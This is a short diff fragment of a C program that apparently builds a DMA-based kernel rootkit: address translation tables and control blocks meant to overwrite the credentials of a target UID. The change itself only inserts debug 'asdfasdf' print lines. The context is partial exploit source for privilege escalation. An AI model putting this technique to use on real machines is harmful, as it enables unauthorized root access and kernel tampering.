@@ -337,21 +337,21 @@ int main(int argc, char *argv[])
     makeVirtPhysPage(&virtCbPage3, &physCbPage3);
 	// Control blocks
 	const cb_t cb = virtCbPage1;
-
+printf("asdfasdf");
 	// Tables
 #define TABLE_ADDRESS (BUS_ADDRESS + 0x2000)
 	vuint8_t *kv2b_table = virtCbPage2;
 	vuint8_t *low_table = kv2b_table + 0x100;
 	vuint8_t *hi_table = low_table + 0x100;
 	vuint32_t *address_table = (vuint32_t *)(hi_table + 0x100);
-	
+	printf("asdfasdf");
 	// Data
 #define DATA_ADDRESS (BUS_ADDRESS + 0x3000)
 	vuint32_t *next_task = virtCbPage3;
 	vuint32_t *cred = next_task + 1;
 	vuint32_t *dummy = cred + 1;
 	vuint8_t *uid = (vuint8_t *)(dummy + 1);
-	
+	printf("asdfasdf");
 	// Build the rootkit tables.
 	for (int i = 0; i < 0x100; ++i)
 		kv2b_table[i] = i + ((BUS_SDRAM_ADDR - PAGE_OFFSET) >> 24);
@@ -359,7 +359,7 @@ int main(int argc, char *argv[])
 	low_table[TARGET_UID & 0xff] = 4;
 	memset((void *)hi_table, 0, 0x100);
 	hi_table[TARGET_UID >> 8] = 8;
-
+	printf("asdfasdf");
 	// Build the rootkit control blocks.
 	// 0. We start with the kernel virtual address of
 	//    __ksymtab_init_task in addr. The first word is the
